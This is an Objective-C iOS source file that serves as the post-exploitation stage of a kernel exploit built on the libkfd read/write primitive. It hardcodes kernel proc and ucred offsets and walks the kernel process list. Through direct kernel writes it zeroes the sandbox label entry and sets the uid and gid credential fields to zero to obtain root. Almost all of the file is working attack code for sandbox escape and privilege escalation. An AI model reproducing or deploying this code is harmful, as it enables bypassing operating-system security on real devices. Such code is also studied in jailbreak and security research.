#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <spawn.h>
#import <mach-o/dyld.h>
#import <sys/stat.h>
#import <stdarg.h>
#import "Utilities.h"
#import "libkfd.h"

uint64_t off_p_pid = 0x68;
uint64_t off_p_task = 0x10;
uint64_t off_p_ucred = 0xf0;
uint64_t off_p_fd = 0xf8;
uint64_t off_p_textvp = 0x220;
uint64_t off_p_name = 0x240;
uint64_t off_p_csflags = 0x280;
uint64_t off_u_cr_label = 0x78;
uint64_t off_p_uid = 0x2c;
uint64_t off_p_ruid = 0x34;
uint64_t off_p_gid = 0x30;
uint64_t off_p_rgid = 0x38;
uint64_t off_u_cr_uid = 0x18;
uint64_t off_u_cr_ruid = 0x1c;
uint64_t off_u_cr_svuid = 0x20;
uint64_t off_u_cr_ngroups = 0x24;
uint64_t off_u_cr_groups = 0x28;
uint64_t off_u_cr_rgid = 0x68;
uint64_t off_u_cr_svgid = 0x6c;

void postExploit(void) {
    uint64_t proc = getProc(getpid());
    if (proc == -1) {
        printf("Failed to get proc\n");
        return;
    }
    printf("proc: 0x%llx\n", proc);
    uint64_t ucred = kread64(proc + off_p_ucred);
    printf("ucred: 0x%llx\n", ucred);
    uint64_t label = kread64(ucred + off_u_cr_label);
    printf("label: 0x%llx\n", label);
    //Escape Sandbox
    kwrite64(label + 0x10, 0);
    printf("sandbox: %llx\n", kread64(label + 0x10));
    //Get Root
    kwrite32(proc + off_p_uid, 0);
    kwrite32(proc + off_p_ruid, 0);
    kwrite32(proc + off_p_gid, 0);
    kwrite32(proc + off_p_rgid, 0);
    kwrite32(ucred + off_u_cr_uid, 0);
    kwrite32(ucred + off_u_cr_ruid, 0);
    kwrite32(ucred + off_u_cr_svuid, 0);
    kwrite32(ucred + off_u_cr_ngroups, 1);
    kwrite32(ucred + off_u_cr_groups, 0);
    kwrite32(ucred + off_u_cr_rgid, 0);
    kwrite32(ucred + off_u_cr_svgid, 0);
    printf("Done! 4\n");
    printf("uid: %u\n", kread32(ucred + off_u_cr_uid));
}

uint64_t getProc(pid_t pid) {
    uint64_t proc = ((struct kfd*)_kfd)->info.kernel.kernel_proc;
    while (true) {
        if(kread32(proc + off_p_pid) == pid) {
            return proc;
        }
        proc = kread64(proc + 0x8);
        if(!proc) {
            return -1;
        }
    }
    return -1;
}

uint32_t kread32(uint64_t where) {
    uint32_t out;
    kread(_kfd, where, &out, sizeof(uint32_t));
    return out;
}

uint64_t kread64(uint64_t where) {
    uint64_t out;
    kread(_kfd, where, &out, sizeof(uint64_t));
    return out;
}

void kwrite32(uint64_t where, uint32_t what) {
    uint32_t _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(where+4);
    kwrite(_kfd, &_buf, where, sizeof(uint64_t));
}

void kwrite64(uint64_t where, uint64_t what) {
    uint64_t _buf[1] = {};
    _buf[0] = what;
    kwrite(_kfd, &_buf, where, sizeof(uint64_t));
}
